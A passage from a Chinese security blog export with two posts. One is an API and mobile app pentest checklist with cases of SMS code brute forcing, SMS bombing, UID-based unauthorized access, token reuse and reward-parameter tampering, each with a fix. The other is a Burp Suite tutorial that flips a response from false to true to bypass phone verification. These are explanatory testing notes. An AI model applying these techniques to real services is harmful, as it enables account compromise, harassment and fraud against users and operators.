class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、好友处手机号明文显示</p>\n<p><img src=\"/images/media/15823569889588.png\"></p>\n<p><img src=\"/images/media/15823409378663.png\"></p>\n<h3 id=\"3、漏洞修复-2\"><a href=\"#3、漏洞修复-2\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、后端对用户手机号或账户名进行隐藏处理</p>\n<p><img src=\"/images/media/15823410770897.png\"></p>\n<h2 id=\"短信验证码爆破\"><a href=\"#短信验证码爆破\" class=\"headerlink\" title=\"短信验证码爆破\"></a>短信验证码爆破</h2><h3 id=\"1、漏洞位置-3\"><a href=\"#1、漏洞位置-3\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>漏洞主要出现用户注册、短信登陆,部分个人手机号绑定等功能处会存在这一安全问题.</p>\n<h3 id=\"2、漏洞影响-3\"><a href=\"#2、漏洞影响-3\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、验证码获取接口<br><img src=\"/images/media/15823354311582.png\"><br>2.2、截获数据包并加载字典进行爆破<br><img src=\"/images/media/15823355728990.png\"> </p>\n<h3 id=\"3、漏洞修复-3\"><a href=\"#3、漏洞修复-3\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、验证失效时间设置5分钟以内<br>2、验证码长度设置6为</p>\n<h2 id=\"短信轰炸\"><a href=\"#短信轰炸\" class=\"headerlink\" title=\"短信轰炸\"></a>短信轰炸</h2><h3 id=\"1、漏洞位置-4\"><a href=\"#1、漏洞位置-4\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>注册或个人密码修改获取验证码处如果未对获取进行次数限制会导致此类漏洞</p>\n<h3 id=\"2、漏洞影响-4\"><a href=\"#2、漏洞影响-4\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、获取验证码<br><img src=\"/images/media/15823511692830.png\"><br>2.2、手机收到15条短信<br><img src=\"/images/media/15823511987787.png\"></p>\n<h3 id=\"3、漏洞修复-4\"><a href=\"#3、漏洞修复-4\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、短信获取次数限制</p>\n<h2 id=\"越权访问\"><a href=\"#越权访问\" class=\"headerlink\" title=\"越权访问\"></a>越权访问</h2><h3 id=\"1、漏洞位置-5\"><a href=\"#1、漏洞位置-5\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>通过修改UID获取其他账户信息;</p>\n<h3 id=\"2、漏洞影响-5\"><a href=\"#2、漏洞影响-5\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>修改user_id获取其他用户信息</p>\n<p><img src=\"/images/media/15822804505543.png\"></p>\n<h3 id=\"3、漏洞修复-5\"><a href=\"#3、漏洞修复-5\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、权限严格控制（后端进行不同账户权限分离）</p>\n<h2 id=\"权限绕过\"><a href=\"#权限绕过\" class=\"headerlink\" title=\"权限绕过\"></a>权限绕过</h2><h3 id=\"1、漏洞位置-6\"><a href=\"#1、漏洞位置-6\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>此漏洞是由于系统进行认证而导致的同一token可登录不同系统中，这类漏洞可以检测针对前后端分离且后端登录入口也是调API来登录的系统.</p>\n<h3 id=\"2、漏洞影响-6\"><a href=\"#2、漏洞影响-6\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、普通账户认证获取的token<br><img src=\"/images/media/15856606263756.png\"><br>2.2、插件替换token，实现权限绕过<br><img src=\"/images/media/15856613206100.png\"><br>2.3、其他操作需结合系统功能进行查找(这里建议查看JS或许能够获取大概请求信息以及F12)<br><img src=\"/images/media/15856613422173.png\"><br>2.4、替换的token可直接调用此API<br><img src=\"/images/media/15856613834891.png\"></p>\n<h3 id=\"3、漏洞修复-6\"><a href=\"#3、漏洞修复-6\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、权限控制严格</p>\n<h2 id=\"参数修改\"><a href=\"#参数修改\" class=\"headerlink\" title=\"参数修改\"></a>参数修改</h2><h3 id=\"1、漏洞位置-7\"><a href=\"#1、漏洞位置-7\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>此漏洞多出现用户访问指定文件或视屏后即可获取奖励，而参数未进行限制（数量未作限制）</p>\n<h3 id=\"2、漏洞影响-7\"><a href=\"#2、漏洞影响-7\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、用户数据修改参数即可完成刷红包<br><img src=\"/images/media/15856614616000.png\"><br>2.2、后台未对参数进行数量限制导致修改sort即可刷红包<br><img src=\"/images/media/7991927F-0364-4E4A-A8C5-CF0916767091.png\"></p>\n<h3 id=\"3、漏洞修复-7\"><a href=\"#3、漏洞修复-7\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、设定sort参数并做好数量限制</p>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><h3 id=\"1、漏洞位置-8\"><a href=\"#1、漏洞位置-8\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>此类漏洞因用户提交恶意字符而服务器端无法解析等问题导致的信息泄露均归属到敏感信息泄露；</p>\n<h3 id=\"2、漏洞影响-8\"><a href=\"#2、漏洞影响-8\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、URL访问如服务器端响应报错<br><img src=\"/images/media/15823482281156.png\"><br>2.2、服务器端敏感文件泄露(某高校缴费系统泄露)<br><img src=\"/images/media/15823487150343.png\"></p>\n<h3 id=\"3、漏洞修复-8\"><a href=\"#3、漏洞修复-8\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、关闭debug<br>2、清理不必要文件、日志等</p>\n<h2 id=\"扩展其他\"><a href=\"#扩展其他\" class=\"headerlink\" title=\"扩展其他\"></a>扩展其他</h2><h2 id=\"任意账户注册\"><a href=\"#任意账户注册\" class=\"headerlink\" title=\"任意账户注册\"></a>任意账户注册</h2><h3 id=\"1、漏洞位置-9\"><a href=\"#1、漏洞位置-9\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>手机号注册未对手机号或昵称进行是否注册检测,或敏感内部平台对外提供服务而为关闭注册入口等.</p>\n<h3 id=\"2、漏洞影响-9\"><a href=\"#2、漏洞影响-9\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、YAPI任意账户注册<br><img src=\"/images/media/5427A3FB-D549-444E-80CC-2870F17A3796.png\"><br>2.2、项目信息,同时越权访问其他邮箱信息<br><img src=\"/images/media/8612A948-98C1-4D83-A017-5B3134691603.png\"></p>\n<h3 id=\"3、漏洞修复-9\"><a href=\"#3、漏洞修复-9\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、关闭注册入口</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"API及客户端漏洞挖掘\"><a href=\"#API及客户端漏洞挖掘\" class=\"headerlink\" title=\"API及客户端漏洞挖掘\"></a>API及客户端漏洞挖掘</h2><h2 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* API文档(postman生成document文档或单功能测试)</span><br><span class=\"line\">* 测试账户两个(权限不同账户)</span><br><span class=\"line\">* Burp Suite工具</span><br><span class=\"line\">* Postman</span><br><span class=\"line\">* MobSF框架</span><br><span class=\"line\">* 浏览器及插件(Chrome&amp;Modheader&amp;postman插件)</span><br><span class=\"line\">* 更新....</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"检测方式\"><a href=\"#检测方式\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、黑盒：只指定apk、ipa安全测试</span><br><span class=\"line\">2、灰盒：API文档、apk、ipa等</span><br><span class=\"line\">3、白盒：审计</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"检测项目及可能存在漏洞\"><a href=\"#检测项目及可能存在漏洞\" class=\"headerlink\" title=\"检测项目及可能存在漏洞\"></a>检测项目及可能存在漏洞</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">备注：</span><br><span class=\"line\">以下整理漏洞可能会存在各自负责待测系统上请谨慎测试.</span><br><span class=\"line\">留意代码逻辑处理是否安全.</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h3><h4 id=\"APK\"><a href=\"#APK\" class=\"headerlink\" title=\"APK\"></a>APK</h4><ol>\n<li>反编译</li>\n<li>APK签名检测</li>\n<li>敏感信息泄露</li>\n<li>组件安全</li>\n<li>应用程序是否可备份</li>\n<li>应用程序权限检测</li>\n<li>敏感信息泄露</li>\n<li>UI泄露</li>\n<li>等等<h4 id=\"IPA\"><a href=\"#IPA\" class=\"headerlink\" title=\"IPA\"></a>IPA</h4></li>\n<li>安全编译选项</li>\n<li>加密缺陷(弱算法、密钥泄露)</li>\n<li>不安全随机数</li>\n<li>XcodeGhost漏洞</li>\n<li>AFNetworking SSL漏洞</li>\n<li>数据存储安全</li>\n<li>日志敏感信息</li>\n<li>网络传输安全</li>\n<li>存储测试服域名或IP地址</li>\n<li>等等</li>\n</ol>\n<h3 id=\"API及Web\"><a href=\"#API及Web\" class=\"headerlink\" title=\"API及Web\"></a>API及Web</h3><ol>\n<li>注册&amp;登陆入口<ol>\n<li>手机号注册登陆<ol>\n<li>短信验证码爆破</li>\n<li>短信验证码回传</li>\n<li>短信验证码失效时间较短</li>\n<li>等等验证码安全问题</li>\n</ol>\n</li>\n<li>昵称登陆<ol>\n<li>验证码复用</li>\n<li>爆破</li>\n<li>用户明文传输(可忽略不计,但建议加密处理)</li>\n</ol>\n</li>\n<li>任意账户注册<ol>\n<li>系统可随机注册不做手机号及昵称检测(检测是否已注册)</li>\n</ol>\n</li>\n</ol>\n</li>\n<li>用户个人信息<ol>\n<li>用户名修改处可能存在XSS(跨站脚本攻击)</li>\n<li>越权修改他人个人信息(通过修改用户uid越权修改他人信息)</li>\n<li>UI信息泄露(个人手机号及他人手机号隐藏展示)</li>\n<li>越权访问(通过UID越权访问他人信息)</li>\n</ol>\n</li>\n<li>文章/视频类<ol>\n<li>参数处存在SQL注入(未过滤)</li>\n<li>命令执行(未对用户输入命令进行转义)</li>\n<li>或其他Web漏洞</li>\n</ol>\n</li>\n<li>分享/红包<ol>\n<li>绕过系统检测分享获取红包(用户注册后台及时更新记录)</li>\n</ol>\n</li>\n<li>签到<ol>\n<li>用户可一直进行签到(绕过签到检测规则)</li>\n</ol>\n</li>\n<li>金额<ol>\n<li>绕过金额最低提现检测(后台检测金额并对比)</li>\n</ol>\n</li>\n<li>用户关系<ol>\n<li>越权访问(可对比用户个人信息项)</li>\n</ol>\n</li>\n<li>新手<ol>\n<li>参数未做处理(修改参数即可刷金额,每访问一次会自动加一)</li>\n</ol>\n</li>\n<li>系统报错<ol>\n<li>debug模式开启报错致信息泄漏(看所用框架类型)<ol>\n<li><strong>debug模式研发须在产品上线前进行关闭</strong></li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<hr>\n<h2 id=\"实战API渗透测试\"><a href=\"#实战API渗透测试\" class=\"headerlink\" title=\"实战API渗透测试\"></a>实战API渗透测试</h2><p>(以下部分演示不完全来自一个API检测结果,同时内部包含部分移动端检测.)</p>\n<h2 id=\"客户端敏感信息\"><a href=\"#客户端敏感信息\" class=\"headerlink\" title=\"客户端敏感信息\"></a>客户端敏感信息</h2><h3 id=\"1、漏洞位置\"><a href=\"#1、漏洞位置\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>敏感数据存在app安装的数据目录中缓存用户的部分信息。</p>\n<h3 id=\"2、漏洞影响\"><a href=\"#2、漏洞影响\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、root手机ssh登陆所在安装目录<br><img src=\"/images/media/FB934E81-F2C3-4994-B399-FE384628D826.png\"><br>2.2、查找敏感数据<br><img src=\"/images/media/8BF0DD98-9D32-4269-A2E5-A6E70F7D8FDD.png\"></p>\n<h3 id=\"3、漏洞修复\"><a href=\"#3、漏洞修复\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、客户端不要缓存客户敏感信息<br>2、客户端脱密后存储</p>\n<h2 id=\"IPA内存在测试服域名信息\"><a href=\"#IPA内存在测试服域名信息\" class=\"headerlink\" title=\"IPA内存在测试服域名信息\"></a>IPA内存在测试服域名信息</h2><h3 id=\"1、漏洞位置-1\"><a href=\"#1、漏洞位置-1\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>IPA源码内存放部分域名信息，被静态分析得到(一般移动端建议经过安全加固进行处理,如果处于debug包可能会泄漏相关信息.)</p>\n<h3 id=\"2、漏洞影响-1\"><a href=\"#2、漏洞影响-1\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、使用本地移动框架自动检测ipa包<br><img src=\"/images/media/DB6EE945-6970-49D9-980F-1BFB50B9B59C.png\"><br>2.2、URL信息获取<br><img src=\"/images/media/4EE52193-37CC-455B-B23A-AD4295F1B23A.png\"></p>\n<h3 id=\"3、漏洞修复-1\"><a href=\"#3、漏洞修复-1\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、手工检查并清理<br>2、针对APK或IPA包进行第三方加固是实现自动清理</p>\n<h2 id=\"UI信息泄漏\"><a href=\"#UI信息泄漏\" class=\"headerlink\" title=\"UI信息泄漏\"></a>UI信息泄漏</h2><h3 id=\"1、漏洞位置-2\"><a href=\"#1、漏洞位置-2\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>用户个人信息及其他信息处(此类漏洞针对金融类APP必须进行后端隐藏处理.)</p>\n<h3 id=\"2、漏洞影响-2\"><a href=\"#2、漏洞影响-2\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、好友处手机号明文显示</p>\n<p><img src=\"/images/media/15823569889588.png\"></p>\n<p><img src=\"/images/media/15823409378663.png\"></p>\n<h3 id=\"3、漏洞修复-2\"><a href=\"#3、漏洞修复-2\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、后端对用户手机号或账户名进行隐藏处理</p>\n<p><img src=\"/images/media/15823410770897.png\"></p>\n<h2 id=\"短信验证码爆破\"><a href=\"#短信验证码爆破\" class=\"headerlink\" title=\"短信验证码爆破\"></a>短信验证码爆破</h2><h3 id=\"1、漏洞位置-3\"><a href=\"#1、漏洞位置-3\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>漏洞主要出现用户注册、短信登陆,部分个人手机号绑定等功能处会存在这一安全问题.</p>\n<h3 id=\"2、漏洞影响-3\"><a href=\"#2、漏洞影响-3\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、验证码获取接口<br><img src=\"/images/media/15823354311582.png\"><br>2.2、截获数据包并加载字典进行爆破<br><img src=\"/images/media/15823355728990.png\"> </p>\n<h3 id=\"3、漏洞修复-3\"><a href=\"#3、漏洞修复-3\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、验证失效时间设置5分钟以内<br>2、验证码长度设置6为</p>\n<h2 id=\"短信轰炸\"><a href=\"#短信轰炸\" class=\"headerlink\" title=\"短信轰炸\"></a>短信轰炸</h2><h3 id=\"1、漏洞位置-4\"><a href=\"#1、漏洞位置-4\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>注册或个人密码修改获取验证码处如果未对获取进行次数限制会导致此类漏洞</p>\n<h3 id=\"2、漏洞影响-4\"><a href=\"#2、漏洞影响-4\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、获取验证码<br><img src=\"/images/media/15823511692830.png\"><br>2.2、手机收到15条短信<br><img src=\"/images/media/15823511987787.png\"></p>\n<h3 id=\"3、漏洞修复-4\"><a href=\"#3、漏洞修复-4\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、短信获取次数限制</p>\n<h2 id=\"越权访问\"><a href=\"#越权访问\" class=\"headerlink\" title=\"越权访问\"></a>越权访问</h2><h3 id=\"1、漏洞位置-5\"><a href=\"#1、漏洞位置-5\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>通过修改UID获取其他账户信息;</p>\n<h3 id=\"2、漏洞影响-5\"><a href=\"#2、漏洞影响-5\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>修改user_id获取其他用户信息</p>\n<p><img src=\"/images/media/15822804505543.png\"></p>\n<h3 id=\"3、漏洞修复-5\"><a href=\"#3、漏洞修复-5\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、权限严格控制（后端进行不同账户权限分离）</p>\n<h2 id=\"权限绕过\"><a href=\"#权限绕过\" class=\"headerlink\" title=\"权限绕过\"></a>权限绕过</h2><h3 id=\"1、漏洞位置-6\"><a href=\"#1、漏洞位置-6\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>此漏洞是由于系统进行认证而导致的同一token可登录不同系统中，这类漏洞可以检测针对前后端分离且后端登录入口也是调API来登录的系统.</p>\n<h3 id=\"2、漏洞影响-6\"><a href=\"#2、漏洞影响-6\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、普通账户认证获取的token<br><img src=\"/images/media/15856606263756.png\"><br>2.2、插件替换token，实现权限绕过<br><img src=\"/images/media/15856613206100.png\"><br>2.3、其他操作需结合系统功能进行查找(这里建议查看JS或许能够获取大概请求信息以及F12)<br><img src=\"/images/media/15856613422173.png\"><br>2.4、替换的token可直接调用此API<br><img src=\"/images/media/15856613834891.png\"></p>\n<h3 id=\"3、漏洞修复-6\"><a href=\"#3、漏洞修复-6\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、权限控制严格</p>\n<h2 id=\"参数修改\"><a href=\"#参数修改\" class=\"headerlink\" title=\"参数修改\"></a>参数修改</h2><h3 id=\"1、漏洞位置-7\"><a href=\"#1、漏洞位置-7\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>此漏洞多出现用户访问指定文件或视屏后即可获取奖励，而参数未进行限制（数量未作限制）</p>\n<h3 id=\"2、漏洞影响-7\"><a href=\"#2、漏洞影响-7\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、用户数据修改参数即可完成刷红包<br><img src=\"/images/media/15856614616000.png\"><br>2.2、后台未对参数进行数量限制导致修改sort即可刷红包<br><img src=\"/images/media/7991927F-0364-4E4A-A8C5-CF0916767091.png\"></p>\n<h3 id=\"3、漏洞修复-7\"><a href=\"#3、漏洞修复-7\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、设定sort参数并做好数量限制</p>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><h3 id=\"1、漏洞位置-8\"><a href=\"#1、漏洞位置-8\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>此类漏洞因用户提交恶意字符而服务器端无法解析等问题导致的信息泄露均归属到敏感信息泄露；</p>\n<h3 id=\"2、漏洞影响-8\"><a href=\"#2、漏洞影响-8\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、URL访问如服务器端响应报错<br><img src=\"/images/media/15823482281156.png\"><br>2.2、服务器端敏感文件泄露(某高校缴费系统泄露)<br><img src=\"/images/media/15823487150343.png\"></p>\n<h3 id=\"3、漏洞修复-8\"><a href=\"#3、漏洞修复-8\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、关闭debug<br>2、清理不必要文件、日志等</p>\n<h2 id=\"扩展其他\"><a href=\"#扩展其他\" class=\"headerlink\" title=\"扩展其他\"></a>扩展其他</h2><h2 id=\"任意账户注册\"><a href=\"#任意账户注册\" class=\"headerlink\" title=\"任意账户注册\"></a>任意账户注册</h2><h3 id=\"1、漏洞位置-9\"><a href=\"#1、漏洞位置-9\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>手机号注册未对手机号或昵称进行是否注册检测,或敏感内部平台对外提供服务而为关闭注册入口等.</p>\n<h3 id=\"2、漏洞影响-9\"><a href=\"#2、漏洞影响-9\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、YAPI任意账户注册<br><img src=\"/images/media/5427A3FB-D549-444E-80CC-2870F17A3796.png\"><br>2.2、项目信息,同时越权访问其他邮箱信息<br><img src=\"/images/media/8612A948-98C1-4D83-A017-5B3134691603.png\"></p>\n<h3 id=\"3、漏洞修复-9\"><a href=\"#3、漏洞修复-9\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、关闭注册入口</p>\n"},{"title":"Burpsuite拦截与修改Response数据包","date":"2019-03-11T02:02:11.000Z","_content":"测试中我们知道,通过Burpsuite可以完成客户端请求服务器端时对数据包拦截、重放以及修改等操作,但可能部分还不了解还可以修改返回数据包,而修改服务器端响应包的好处是什么呢?\n下面我们尝试修改Burpsuite配置完成修改Response方式\n\n### Burpsuite拦截\n1.Burpsuite默认是拦截、修改Request数据包(也可以修改其他规则拦截其他类型数据)\n![](/images/Burpsuite/bp1.png)\n1.1.Request拦截配置(红色标记处默认两处已选择)\n![](/images/Burpsuite/bp2.png)\n1.2.通过修改proxy选项，option内修改Response\n配置勾选如下图所示，新建规则/修改之前规则也可以.\n![](/images/Burpsuite/bp3.png)\n\n### 方法一\n\n1.通过修改proxy选项，option内修改Response配置.\n配置勾选如下图所示，新建规则/修改之前规则也可以.\n![](/images/Burpsuite/bp4.png)\n2.测试\n![](/images/Burpsuite/bp5.png)\n\n<center>Request请求数据包</center>\n\n![](/images/Burpsuite/bp6.png)\n\n<center>Response拦截</center> \n\n### 方法二\n1.正常数据包拦截\n![](/images/Burpsuite/bp7.png)\n\n<center>点击后即可完成此请求的服务器返回数据包拦截</center> \n\n  ![](/images/Burpsuite/bp8.png)\n\n <center>Response拦截成功</center> \n\n### 实战\n1.用户注册\n```BASH\nusername:si1entt\npasswd:si1enta123\n```\n![](/images/Burpsuite/bp9.png)\n2.手机号绑定\n业务逻辑：输入正确手机号并获取验证码输入后方可验证通过\n![](/images/Burpsuite/bp10.png)\n3.此时我们尝试输入非使用手机号绕过验证\n随机输入手机号、手机号验证码、以及校验码\n![](/images/Burpsuite/bp11.png)\n![](/images/Burpsuite/bp12.png)\n\n<center>Response数据包获取</center> \n\n4.修改response数据，false为true并重放\n![](/images/Burpsuite/bp13.png)\n![](/images/Burpsuite/bp14.png)\n5.用户登陆查看数据绑定手机号信息\n![](/images/Burpsuite/bp15.png)\n\n### 结束\nBurpsuite功能点还有很多需要测试、学习.","source":"_posts/Burpsuite拦截与修改Response数据包.md","raw":"---\ntitle: Burpsuite拦截与修改Response数据包\ndate: 2019-03-11 10:02:11\ntag:\n\t- Burpsuite\n---\n测试中我们知道,通过Burpsuite可以完成客户端请求服务器端时对数据包拦截、重放以及修改等操作,但可能部分还不了解还可以修改返回数据包,而修改服务器端响应包的好处是什么呢?\n下面我们尝试修改Burpsuite配置完成修改Response方式\n\n### Burpsuite拦截\n1.Burpsuite默认是拦截、修改Request数据包(也可以修改其他规则拦截其他类型数据)\n![](/images/Burpsuite/bp1.png)\n1.1.Request拦截配置(红色标记处默认两处已选择)\n![](/images/Burpsuite/bp2.png)\n1.2.通过修改proxy选项，option内修改Response\n配置勾选如下图所示，新建规则/修改之前规则也可以.\n![](/images/Burpsuite/bp3.png)\n\n### 方法一\n\n1.通过修改proxy选项，option内修改Response配置.\n配置勾选如下图所示，新建规则/修改之前规则也可以.\n![](/images/Burpsuite/bp4.png)\n2.测试\n![](/images/Burpsuite/bp5.png)\n\n<center>Request请求数据包</center>\n\n![](/images/Burpsuite/bp6.png)\n\n<center>Response拦截</center> \n\n### 方法二\n1.正常数据包拦截\n![](/images/Burpsuite/bp7.png)\n\n<center>点击后即可完成此请求的服务器返回数据包拦截</center> \n\n  ![](/images/Burpsuite/bp8.png)\n\n <center>Response拦截成功</center> \n\n### 实战\n1.用户注册\n```BASH\nusername:si1entt\npasswd:si1enta123\n```\n![](/images/Burpsuite/bp9.png)\n2.手机号绑定\n业务逻辑：输入正确手机号并获取验证码输入后方可验证通过\n![](/images/Burpsuite/bp10.png)\n3.此时我们尝试输入非使用手机号绕过验证\n随机输入手机号、手机号验证码、以及校验码\n![](/images/Burpsuite/bp11.png)\n![](/images/Burpsuite/bp12.png)\n\n<center>Response数据包获取</center> \n\n4.修改response数据，false为true并重放\n![](/images/Burpsuite/bp13.png)\n![](/images/Burpsuite/bp14.png)\n5.用户登陆查看数据绑定手机号信息\n![](/images/Burpsuite/bp15.png)\n\n### 结束\nBurpsuite功能点还有很多需要测试、学习.","slug":"Burpsuite拦截与修改Response数据包","published":1,"updated":"2020-10-23T04:26:22.383Z","_id":"ckglobhdb0002b1hq8cp5cv2w","comments":1,"layout":"post","photos":[],"link":"","content":"<p>测试中我们知道,通过Burpsuite可以完成客户端请求服务器端时对数据包拦截、重放以及修改等操作,但可能部分还不了解还可以修改返回数据包,而修改服务器端响应包的好处是什么呢?<br>下面我们尝试修改Burpsuite配置完成修改Response方式</p>\n<h3 id=\"Burpsuite拦截\"><a href=\"#Burpsuite拦截\" class=\"headerlink\" title=\"Burpsuite拦截\"></a>Burpsuite拦截</h3><p>1.Burpsuite默认是拦截、修改Request数据包(也可以修改其他规则拦截其他类型数据)<br><img src=\"/images/Burpsuite/bp1.png\"><br>1.1.Request拦截配置(红色标记处默认两处已选择)<br><img src=\"/images/Burpsuite/bp2.png\"><br>1.2.通过修改proxy选项，option内修改Response<br>配置勾选如下图所示，新建规则/修改之前规则也可以.<br><img src=\"/images/Burpsuite/bp3.png\"></p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>1.通过修改proxy选项，option内修改Response配置.<br>配置勾选如下图所示，新建规则/修改之前规则也可以.<br><img src=\"/images/Burpsuite/bp4.png\"><br>2.测试<br><img src=\"/images/Burpsuite/bp5.png\"></p>\n<center>Request请求数据包</center>\n\n<p><img src=\"/images/Burpsuite/bp6.png\"></p>\n<center>Response拦截</center> \n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>1.正常数据包拦截<br><img src=\"/images/Burpsuite/bp7.png\"></p>\n<center>点击后即可完成此请求的服务器返回数据包拦截</center> \n\n<p>  <img src=\"/images/Burpsuite/bp8.png\"></p>\n <center>Response拦截成功</center> \n\n<h3 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h3><p>1.用户注册</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username:si1entt</span><br><span class=\"line\">passwd:si1enta123</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Burpsuite/bp9.png\"><br>2.手机号绑定<br>业务逻辑：输入正确手机号并获取验证码输入后方可验证通过<br><img src=\"/images/Burpsuite/bp10.png\"><br>3.此时我们尝试输入非使用手机号绕过验证<br>随机输入手机号、手机号验证码、以及校验码<br><img src=\"/images/Burpsuite/bp11.png\"><br><img src=\"/images/Burpsuite/bp12.png\"></p>\n<center>Response数据包获取</center> \n\n<p>4.修改response数据，false为true并重放<br><img src=\"/images/Burpsuite/bp13.png\"><br><img src=\"/images/Burpsuite/bp14.png\"><br>5.用户登陆查看数据绑定手机号信息<br><img src=\"/images/Burpsuite/bp15.png\"></p>\n<h3 id=\"结束\"><a href=\"#结束\" class=\"headerlink\" title=\"结束\"></a>结束</h3><p>Burpsuite功能点还有很多需要测试、学习.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>测试中我们知道,通过Burpsuite可以完成客户端请求服务器端时对数据包拦截、重放以及修改等操作,但可能部分还不了解还可以修改返回数据包,而修改服务器端响应包的好处是什么呢?<br>下面我们尝试修改Burpsuite配置完成修改Response方式</p>\n<h3 id=\"Burpsuite拦截\"><a href=\"#Burpsuite拦截\" class=\"headerlink\" 